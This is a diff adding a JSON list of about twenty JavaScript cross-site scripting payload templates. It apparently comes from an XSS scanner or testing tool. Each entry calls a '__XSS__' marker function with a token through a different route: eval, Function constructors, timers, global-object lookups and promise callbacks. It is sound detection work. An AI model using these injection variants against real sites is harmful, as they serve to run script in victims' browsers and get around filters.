@@ -1,0 +1,22 @@
+[
+  "__XSS__('{{TOKEN}}')",
+  "alert('{{TOKEN}}');__XSS__('{{TOKEN}}')",
+  "eval('__XSS__(\"{{TOKEN}}\")')",
+  "Function('__XSS__(\"{{TOKEN}}\")')()",
+  "setTimeout('__XSS__(\"{{TOKEN}}\")',0)",
+  "setInterval('__XSS__(\"{{TOKEN}}\")',0)",
+  "new Function('__XSS__(\"{{TOKEN}}\")')()",
+  "['constructor']['constructor']('__XSS__(\"{{TOKEN}}\")')()",
+  "window['__XSS__']('{{TOKEN}}')",
+  "top['__XSS__']('{{TOKEN}}')",
+  "self['__XSS__']('{{TOKEN}}')",
+  "parent['__XSS__']('{{TOKEN}}')",
+  "globalThis['__XSS__']('{{TOKEN}}')",
+  "(0,__XSS__)('{{TOKEN}}')",
+  "window?.__XSS__?.('{{TOKEN}}')",
+  "queueMicrotask(()=>__XSS__('{{TOKEN}}'))",
+  "Promise.resolve().then(()=>__XSS__('{{TOKEN}}'))",
+  "setTimeout(\"__XSS__('{{TOKEN}}')\",0)",
+  "[].filter.constructor(\"__XSS__('{{TOKEN}}')\")()",
+  "this['__XSS__']?this['__XSS__']('{{TOKEN}}'):top['__XSS__']('{{TOKEN}}')"
+]
